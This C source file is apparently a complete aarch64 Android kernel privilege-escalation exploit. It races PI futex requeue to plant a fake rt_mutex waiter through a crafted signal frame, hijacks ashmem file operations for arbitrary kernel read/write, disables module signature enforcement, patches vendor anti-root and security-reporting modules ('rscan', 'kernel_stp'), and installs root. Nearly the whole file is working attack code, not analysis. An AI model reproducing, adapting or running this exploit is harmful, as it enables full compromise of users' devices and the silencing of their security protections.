#include "common.h"
#include "module.h"
#include "cpubind.h"
#include <sys/ioctl.h>
#include <signal.h>
#include <sys/mman.h>
#include <time.h>
#include <pthread.h>
#include <sched.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <stdio.h>
#include <sys/wait.h>
#include <errno.h>

#define dbg_ret(msg, ret, expected) \
    fprintf(stderr, "[dbg] %s: ret=%ld errno=%d (%s) %s\n", \
            (msg), (long)(ret), errno, strerror(errno), (errno==expected) ? "expected" : "unexpected")

/* ---------- 常数 ---------- */
#define CONSUME_DELAY 2000
#define CONSUME_SEC 1
#define STACK_ENTER_DELAY_USEC 50000
#define WAIT_SECONDS 5

struct run_config {
    uint64_t rb_parent_color;
    uint64_t rb_left_addr;
    uint64_t rb_right_addr;
};

static struct run_config g_cfg;

/* ---------- 全局变量 ---------- */
static unsigned int stage;
static uint32_t f_wait;
static uint32_t f_pi_target;
static uint32_t f_pi_chain;
static atomic_int waiter_ready;
static atomic_int waiter_waiting;
static atomic_int owner_started;
static atomic_int route_done;
static atomic_int waiter_tid;
static atomic_int consume_calls;
static atomic_int consume_go;
static atomic_int consume_seen;
static atomic_int consume_lost;
static atomic_int consume_enter_sched;
static atomic_int sched_stop;
static atomic_int consume_stop;
static atomic_int consume_sched_ok;
static atomic_int consume_last_sched_ret;
static atomic_int consume_last_sched_errno;
static uint64_t fake_lock_addr;

/* ---------- 跨运行共享：owner 线程的可停止句柄 ---------- */
static pthread_t  g_run_owner_thr;
static atomic_int g_owner_stop;    /* 1 => owner 退出 pause 循环并释放 futex */
static atomic_int g_owner_alive;   /* 1 => owner 仍在运行 */
static atomic_int g_run_owner_valid; /* 1 => 上次曾创建过 owner，需要清理 */

uint64_t kaslr_slide;
int kaslr_done;
uint64_t kaslr_base;
int memfd_leak;
int rw_ashmem_fd=-1;

uint64_t proof_addr;

/* ---------- 独立 KASLR ---------- */
#define kaslr_addr(img) ((img)+kaslr_slide)

static int get_independent_slide(void) {
    if(kaslr_done)return 0;
    kaslr_slide = get_kaslr_offset();
    if(!kaslr_slide)return 1;
    pr_info("slide: %"PRIx64"\n", kaslr_slide);
    kaslr_base = kaslr_slide + KIMAGE_TEXT_BASE;
    kaslr_done = 1;
    return 0;
}
uint64_t text_addr(uint64_t image){return kaslr_addr(image);};
uint64_t data_offset;
uint64_t data_addr(uint64_t image){
    if(!data_offset){
        if(rw_ashmem_fd<0)return 0;
        uint64_t voffset=kernel_read64(rw_ashmem_fd,kaslr_addr(KIMAGE_VOFFSET));
        uint64_t memstart_addr=kernel_read64(rw_ashmem_fd,kaslr_addr(MEMSTART_ADDR));
        data_offset=kaslr_slide-voffset-memstart_addr+DIRECT_MAP_BASE;
        if(!voffset || !is_kernel_ptr(data_offset))return 0;
        pr_success("initalized data offset %"PRIx64"\n",data_offset);
    };
    return image+data_offset;
};
uint64_t canon_addr(uint64_t image_addr) {return text_addr(image_addr);};

uint64_t module_read(uint64_t addr){
    return sysctl_read(rw_ashmem_fd,addr);
};

static struct rt_mutex_waiter g_sig_waiter;

struct file_operations fops;

static void init_fops(void) {
    memset(&fops, 0, sizeof(fops));
    fops.owner            = NULL;
    fops.unlocked_ioctl   = kaslr_addr(ASHMEM_IOCTL);
    fops.compat_ioctl     = kaslr_addr(ASHMEM_COMPAT_IOCTL);
    fops.mmap             = kaslr_addr(ASHMEM_MMAP);
    fops.open             = kaslr_addr(ASHMEM_OPEN);
    fops.release          = kaslr_addr(ASHMEM_RELEASE);
    fops.show_fdinfo      = kaslr_addr(ASHMEM_SHOW_FDINFO);
    fops.read_iter             = kaslr_addr(CONFIGFS_READ_ITER);
    fops.read        = 0;
    fops.write_iter            = kaslr_addr(CONFIGFS_BIN_WRITE_ITER);
    fops.write       = 0;
    fops.llseek           = kaslr_addr(NOOP_LLSEEK);
}

struct rt_sigframe {
    siginfo_t info;
    ucontext_t uc;
};
__attribute__((noinline,optnone))
void sig_stack_copy(void) {
    memset(&g_sig_waiter, 0, sizeof(g_sig_waiter));
    g_sig_waiter.task     = (struct task_struct *)kaslr_addr(SLIDE_INIT_TASK_IMAGE);
    g_sig_waiter.lock     = (struct rt_mutex_base *)fake_lock_addr;
    g_sig_waiter.prio     = FAKE_WAITER_PRIO;
    g_sig_waiter.deadline = 0;

    struct rb_node fake = {0};
    uint64_t parent_color = g_cfg.rb_parent_color;
    uint64_t left_addr    = g_cfg.rb_left_addr;
    uint64_t right_addr   = g_cfg.rb_right_addr;

    fake.__rb_parent_color = parent_color;
    fake.rb_right          = (struct rb_node *)right_addr;
    fake.rb_left           = (struct rb_node *)left_addr;
    g_sig_waiter.tree_entry    = fake;
    g_sig_waiter.pi_tree_entry = fake;

    struct rt_sigframe _frame;
    struct rt_sigframe *frame = (struct rt_sigframe *)&_frame;
    memset(frame, 0, sizeof(_frame));

    ucontext_t *uc = (ucontext_t *)&frame->uc;
    struct fpsimd_context *fp =
        (struct fpsimd_context *)(uc->uc_mcontext.__reserved);

    fp->head.magic = FPSIMD_MAGIC;
    fp->head.size = sizeof(*fp);
    pr_info("before sig\n");

    memcpy(((char*)&fp->vregs)+WAITER_OFF_FROM_VREGS, &g_sig_waiter, sizeof(g_sig_waiter));

    __asm__ volatile("mrs %0, nzcv" : "=r"(uc->uc_mcontext.pstate));
    uc->uc_mcontext.pc = (unsigned long)(&&sig_return_loop);
    __asm__ volatile("mov %0, sp" : "=r"(uc->uc_mcontext.sp));
    atomic_store(&consume_go, 1);

    __asm__ volatile(
        "stp x0, x1, [%0, #8]\n\t"
        "stp x2, x3, [%0, #24]\n\t"
        "stp x4, x5, [%0, #40]\n\t"
        "stp x6, x7, [%0, #56]\n\t"
        "stp x8, x9, [%0, #72]\n\t"
        "stp x10, x11, [%0, #88]\n\t"
        "stp x12, x13, [%0, #104]\n\t"
        "stp x14, x15, [%0, #120]\n\t"
        "stp x16, x17, [%0, #136]\n\t"
        "stp x18, x19, [%0, #152]\n\t"
        "stp x20, x21, [%0, #168]\n\t"
        "stp x22, x23, [%0, #184]\n\t"
        "stp x24, x25, [%0, #200]\n\t"
        "stp x26, x27, [%0, #216]\n\t"
        "stp x28, x29, [%0, #232]\n\t"
        "str x30, [%0, #248]\n\t"
        :
        : "r"(&uc->uc_mcontext)
        : "memory");

    __asm__ volatile goto(
        "mov sp, %1\n\t"
        "mov x8, %2\n\t"
        "svc #0\n\t"
        "mov x0, #1\n\t"
        "mov x8, %3\n\t"
        "svc #0\n\t"
        :
        : "r"(&uc->uc_mcontext),
          "r"(frame),
          "i"(__NR_rt_sigreturn),
          "i"(__NR_exit_group)
        : "memory", "x0", "x8", "cc"
        : sig_return_loop
    );

    _exit(1);

sig_return_loop:
    if (!atomic_load_explicit(&consume_enter_sched, memory_order_acquire)) {
        __asm__ volatile goto(
            "mov sp, %[frame]\n\t"
            "mov x8, %[nr]\n\t"
            "svc #0\n\t"
            "mov x0, #1\n\t"
            "mov x8, %[exit_nr]\n\t"
            "svc #0\n\t"
            :
            : [frame]   "r"(frame),
              [nr]      "i"(__NR_rt_sigreturn),
              [exit_nr] "i"(__NR_exit_group)
            : "memory", "x0", "x8", "cc":sig_return_loop
        );
    }
    atomic_store(&sched_stop, 1);
    while (!atomic_load(&consume_stop))
        __asm__ volatile("yield" ::: "memory");
    atomic_store(&consume_go, 0);
    pr_info("after sig\n");
    return;
}

static void interrupt_handler(int sig) {
    (void)sig;
}
extern long ppoll_from_regs(void* regs);
static long raw_ppoll_wait(void) {
    signal(SIGUSR1, interrupt_handler);
    long regs[31];
    memcpy(regs,&fops,sizeof(regs));
    memset(&regs,0,4*sizeof(long));
    return ppoll_from_regs(&regs);
}

/* ---------- 消费者线程（每次运行临时创建，会自行退出） ---------- */
void *consumer_thread(void *arg __attribute__((unused))) {
    disable_rseq_for_thread();
    cpubind_bind_hi2();
    SYSCHK(sched_setattr_tid(syscall(SYS_gettid), -20));
    int seen = 0;
    for (;;) {
        int seq = atomic_load(&consume_go);
        if (seq == 0 || seq == seen) {
            __asm__ volatile("yield" ::: "memory");
            if (atomic_load(&consume_stop)) return NULL;
            continue;
        }
        seen = seq;
        atomic_store(&consume_seen, seen);
        if (CONSUME_SEC) {
            sleep(CONSUME_SEC);
        } else {
            for (int spin = 0; spin < CONSUME_DELAY; spin++)
                __asm__ volatile("yield" ::: "memory");
        }
        if (atomic_load(&consume_go) != seq) continue;

        if (seq == 1) usleep(STACK_ENTER_DELAY_USEC);

        int tid = atomic_load(&waiter_tid);
        int calls = atomic_load(&consume_calls);
        pr_info("before sched\n");
        atomic_store(&consume_calls, calls + 1);
        atomic_store(&consume_enter_sched,
                     atomic_load(&consume_enter_sched) + 1);
        while (!atomic_load(&sched_stop))
            __asm__ volatile("yield" ::: "memory");
        errno = 0;
        long ret = sched_setattr_tid(tid, -19);
        pr_info("after sched\n");
        int saved_errno = errno;
        if (stage == 2) {
            pr_info("openning fd\n");
            rw_ashmem_fd=open_ashmem_device();
            uint64_t buf=kaslr_addr(ASHMEM_FOPS);
            errno = 0;
            if(!KWRITE(rw_ashmem_fd,kaslr_addr(ASHMEM_MISC_FOPS),buf))
                perror("ashmem restore");
        }
        atomic_store(&consume_last_sched_ret, (int)ret);
        atomic_store(&consume_last_sched_errno, saved_errno);
        if (ret == 0)
            atomic_store(&consume_sched_ok,
                         atomic_load(&consume_sched_ok) + 1);
        atomic_store(&consume_stop, 1);
        while (atomic_load(&consume_go))
            __asm__ volatile("yield" ::: "memory");
        return NULL;
    }
}

/* ---------- waiter 线程：第一次的 waiter 会长期存活 ---------- */
void *waiter_thread(void *arg __attribute__((unused))) {
    cpubind_bind_hi1();
    int tid = (int)syscall(SYS_gettid);
    SYSCHK(sched_setattr_tid(tid, -20));
    atomic_store(&waiter_tid, tid);

    if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
        return NULL;

    atomic_store(&waiter_ready, 1);
    while (!atomic_load(&owner_started)) usleep(1000);
    pr_info("before futex\n");
    struct timespec timeout;
    clock_gettime(CLOCK_MONOTONIC, &timeout);
    timeout.tv_sec += WAIT_SECONDS;
    atomic_store(&waiter_waiting, 1);
    futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
             &f_pi_target, 0);

    futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    pr_info("after futex\n");
    sig_stack_copy();
    pr_info("before clean\n");
    static uint32_t dummy_futex = 1;
    struct timespec small_timeout = { .tv_sec = 0, .tv_nsec = 100000 };
    errno = 0;
    int clean_ret = futex_op(&dummy_futex, FUTEX_WAIT, 1, &small_timeout, NULL, 0);
    dbg_ret("after clean",clean_ret,ETIMEDOUT);
    atomic_store(&route_done, 1);

    if (stage == 1) {
        for(;;)raw_ppoll_wait();
        pr_info("returned from ppoll \n");
    }
/*    if (stage == 2) {
        pr_info("before pause\n");
        pause();
        pr_info("returned from pause \n");
    }*/
    return 0;
}

/* ---------- owner 线程：可以被打断并清理 ---------- */
void *owner_thread(void *arg __attribute__((unused))) {
    atomic_store(&g_owner_alive, 1);

    sched_setattr_tid(syscall(SYS_gettid), 19);
    if (futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
        atomic_store(&g_owner_alive, 0);
        return NULL;
    }
    while (!atomic_load(&waiter_ready)) usleep(1000);
    atomic_store(&owner_started, 1);
    futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);

    /* 等待停止信号，被唤醒时检查 g_owner_stop */
    while (!atomic_load(&g_owner_stop))
        pause();

    /* 释放两个 PI futex，方便下一轮重新使用同一块内存 */
    futex_op(&f_pi_chain,  FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);

    atomic_store(&g_owner_alive, 0);
    return NULL;
}

/* ============================================================
 * 单次运行的清理：等待上一次的 owner 退出，然后复位所有共享状态
 * ============================================================ */
static void reset_run_state(void) {
    /* 1) 若上一次创建过 owner，先让它退出 */
    if (atomic_load(&g_run_owner_valid)) {
        atomic_store(&g_owner_stop, 1);
        for (int i = 0; i < 500 && atomic_load(&g_owner_alive); i++) {
            /* 周期性发 SIGUSR2 打断 pause()，也顺带打断可能被卡住的 futex */
            if ((i % 5) == 0)
                pthread_kill(g_run_owner_thr, SIGUSR2);
            usleep(1000);
        }
        if (atomic_load(&g_owner_alive))
            pr_warning("slide: owner did not exit in time\n");
        atomic_store(&g_run_owner_valid, 0);
    }
    atomic_store(&g_owner_alive, 0);
    atomic_store(&g_owner_stop, 0);

    /* 2) 复位 futex 变量（内核里的 futex 桶在 owner 释放后应为空） */
    f_wait       = 0;
    f_pi_target  = 0;
    f_pi_chain   = 0;

    /* 3) 复位所有本次运行使用的原子变量 */
    atomic_store(&waiter_ready,           0);
    atomic_store(&waiter_waiting,         0);
    atomic_store(&owner_started,          0);
    atomic_store(&route_done,             0);
    atomic_store(&waiter_tid,             0);
    atomic_store(&consume_calls,          0);
    atomic_store(&consume_go,             0);
    atomic_store(&consume_seen,           0);
    atomic_store(&consume_lost,           0);
    atomic_store(&consume_enter_sched,    0);
    atomic_store(&sched_stop,             0);
    atomic_store(&consume_stop,           0);
    atomic_store(&consume_sched_ok,       0);
    atomic_store(&consume_last_sched_ret, 0);
    atomic_store(&consume_last_sched_errno, 0);
}

/* ---------- 子进程主函数（单次），当前进程内运行 ---------- */
uint64_t ghostlock_main(void) {
    if (cpubind_init()) return 0;
    cpubind_bind_main();

    /* 所有辅助线程都 detach —— waiter 保持存活，不 join 不 kill */
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);

    pthread_t waiter, consumer;
    pthread_create(&waiter, &attr, waiter_thread, NULL);
    pthread_create(&g_run_owner_thr, &attr, owner_thread, NULL);
    atomic_store(&g_run_owner_valid, 1);   /* 标记：本轮创建了 owner */
    pthread_create(&consumer, &attr, consumer_thread, NULL);

    pthread_attr_destroy(&attr);

    while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
        usleep(1000);

    errno = 0;
    int cmp_ret = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void*)1,
             &f_pi_target, 0);
    dbg_ret("cmped",cmp_ret,EDEADLK);
    while (!atomic_load(&route_done)) sleep(1);

    cpubind_shutdown();
    if(stage == 2)return 1;
    return sysctl_read(-1,0);
}

/* ============================================================
 * 单次运行：同一进程内直接执行，无需 fork
 * ============================================================ */
static uint64_t run_one(const struct run_config *cfg) {
    g_cfg = *cfg;   /* 本轮使用的 config */

    /* 每次运行前先把上一轮留下的 owner / 状态清理干净
     * （waiter 不清理：需求要求第一次的 waiter 长期存活） */
    reset_run_state();

    log_context();
    return ghostlock_main();
}

void modinfo(uint64_t mod){
    char ver[64], src[64], scm[128];

    if (mod) {
    /* 状态：确认模块已完整加载且可解析符号 */
        int st = module_get_state(mod);           /* 期望 MOD_STATE_LIVE */
        pr_info("state: %s\n",module_state_name(st));
        /* vermagic 由 version 字段暴露 */
        if (module_get_version(mod, ver, sizeof(ver)) == 0){
            ver[63]='\0';
            pr_info("ver: %s\n",ver);
        }

        /* srcversion：内核按源码计算出的 12 位 hash，与 .ko 的
         * .modinfo 中 srcversion= 完全一致 */
        if (module_get_srcversion(mod, src, sizeof(src)) == 0){
            src[63]='\0';
            pr_info("src: %s\n",src);
        }
        /* 与本地 .ko modinfo 的 srcversion 对比 */;

        /* scmversion：仅在内核编译时提供（如 UTS_VERSION / git describe）
         * 时存在；不匹配说明模块或内核版本不对 */
        if (module_get_scmversion(mod, scm, sizeof(scm)) == 0){
            scm[127]='\0';
            pr_info("scm: %s\n",scm);
        }
        /* 与本地 .ko 或内核 build 信息对比 */;
    }
};
void disable_antiroot_mod(void){
    if(rw_ashmem_fd<0){
        pr_warning("call before rw\n");
        return;
    };
    uint64_t start=0,end=0;
    uint64_t rscan=module_find_by_name("rscan");
    if(rscan){
        if(!module_section_range(rscan,MOD_SEC_DATA,&start,&end)){
/*            int read[6];
            memset(read,0,sizeof(read));
            kernel_read_data(rw_ashmem_fd,start+RSCAN_DATA_SKIP_OFF,read,sizeof(read));
            hexdump(read,sizeof(read));*/
            int skip[6]={1,1,1,1,1,1};
            if(KWRITE(rw_ashmem_fd,start+RSCAN_DATA_SKIP_OFF,skip))
                 pr_success("rscan skipped\n");
        }
        start=0;
        end=0;
    };

    uint64_t stp=module_find_by_name("kernel_stp");
    if(stp){
        if(!module_section_range(stp,MOD_SEC_DATA,&start,&end)){
//            pr_info("%lx\n",kernel_read64(rw_ashmem_fd,start+STP_BSS_KOBJ_OFF));
            uint64_t nop=0;
            if(KWRITE(rw_ashmem_fd,start+STP_DATA_KOBJ_OFF,nop))
                 pr_success("stp upload cracked\n");
        }
    };
    pr_info("%"PRIx64" %"PRIx64"\n",rscan,stp);
};
/* ---------- 主验证函数 ---------- */
int exploit_main(void) {
    init_ashmem_path();
    if (get_independent_slide() != 0) return 0;
    init_fops();
    struct run_config cfg;
    memset(&cfg,0,sizeof(cfg));
    stage = 1;
    uint64_t stack_addr;

    fake_lock_addr = kaslr_addr(DUMP_SKIP_ZEROES);
    cfg.rb_parent_color  = fake_lock_addr + 8;
    cfg.rb_left_addr = kaslr_addr(SYSCTL_DATA_ADDR);
    pr_info("=== stage %u: parent=%llx left=%llx right=%llx ===\n",
            stage,
            (unsigned long long)cfg.rb_parent_color,
            (unsigned long long)cfg.rb_left_addr,
            (unsigned long long)cfg.rb_right_addr);
    stack_addr = run_one(&cfg);
    pr_info("%"PRIx64"\n",stack_addr);
    if (!is_kernel_ptr(stack_addr)) return 0;
    int tid=atomic_load(&waiter_tid);
    fake_lock_addr += 32;
    cfg.rb_parent_color = stack_addr+PT_REGS_OFF_FROM_WAITER;//slide_loggers_0_1_addr + 8;
    cfg.rb_left_addr = kaslr_addr(ASHMEM_MISC_FOPS);
    stage = 2;
    pr_info("=== stage %u: parent=%llx left=%llx right=%llx ===\n",
            stage,
            (unsigned long long)cfg.rb_parent_color,
            (unsigned long long)cfg.rb_left_addr,
            (unsigned long long)cfg.rb_right_addr);
    if(!run_one(&cfg)) return 0;
    uint64_t buf=kaslr_addr(NOOP_LLSEEK);
    int ret = KWRITE(rw_ashmem_fd,cfg.rb_parent_color+8,buf);
    if(!ret)goto cleanup;
    int enforce=0;
    ret &= KREAD(rw_ashmem_fd,text_addr(SIG_ENFORCE),enforce);
    if(!ret)goto cleanup;
    if(enforce==1){
        enforce=0;
        ret &= KWRITE(rw_ashmem_fd,text_addr(SIG_ENFORCE),enforce);
        if(!ret)goto cleanup;
        pr_success("sig_enforce reset\n");
    }else if(enforce != 0)
        pr_warning("not valid sig_enforce %x\n",enforce);
    pr_info("ashmem fd %d \n",rw_ashmem_fd);
//    pr_info("origin stack %lx\n",kernel_read64(rw_ashmem_fd,slide_fake_lock_addr-32+8));
    proof_addr=data_addr(DUMP_SKIP_ZEROES+0x100);
    ret &= install_pipe_physrw(rw_ashmem_fd);
    char zeroes[PAGE_SIZE];
    memset(zeroes,0,sizeof(zeroes));
    ret &= KWRITE(rw_ashmem_fd,kaslr_addr(DUMP_SKIP_ZEROES),zeroes);
    if(!ret)goto cleanup;
    disable_antiroot_mod();
//    (void)getchar();
    ret &=install_android_root(rw_ashmem_fd);


cleanup:
    reset_pipe_attempt();
    sysctl_destroy(rw_ashmem_fd);
    close(rw_ashmem_fd);
    errno = 0;
    if(kill(tid,SIGUSR1))
        perror("waiter death");
    return ret;
}

int main(int argc, char *argv[]) {
//    if (argc > 1) g_kallsyms_path = argv[1];

    /* 用于唤醒 owner 的 pause()，让它检查 g_owner_stop */
    signal(SIGUSR2, interrupt_handler);

    log_startup_context();
    if (exploit_main()) {
        pr_success("SUCCESS\n");
        return 0;
    }
    pr_warning("FAILED");
    return 1;
}
